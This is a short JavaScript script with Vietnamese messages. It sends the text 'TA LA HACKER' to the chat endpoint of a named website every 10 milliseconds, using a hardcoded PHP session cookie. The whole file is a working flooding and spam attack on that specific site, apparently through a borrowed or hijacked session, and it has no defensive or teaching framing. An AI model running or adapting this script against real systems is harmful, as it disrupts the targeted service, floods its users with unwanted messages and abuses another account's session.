const url = "https://nguyenledangkhoa.id.vn/app/controllers/ChatController.php";
const message = "TA LA HACKER"; 
const receiverId = "123";
const sessionCookie = "PHPSESSID=df0rgdeh0kj8qu6h4unodahv2l";
async function sendMessage() {
    try {
        const bodyData = `message=${encodeURIComponent(message)}`
        const response = await fetch(url, {
            method: "POST",
            headers: { 
                "Content-Type": "application/x-www-form-urlencoded", 
                "Cookie": sessionCookie,
            },
            body: bodyData,
        });

        if (!response.ok) {
            throw new Error(`Server trả về lỗi: ${response.status}`);
        }

        const text = await response.text();
        console.log("Phản hồi từ server:", text);

    } catch (error) {
        console.error("Lỗi khi gửi tin nhắn:", error);
    }
}

setInterval(() => {
    sendMessage();
}, 10)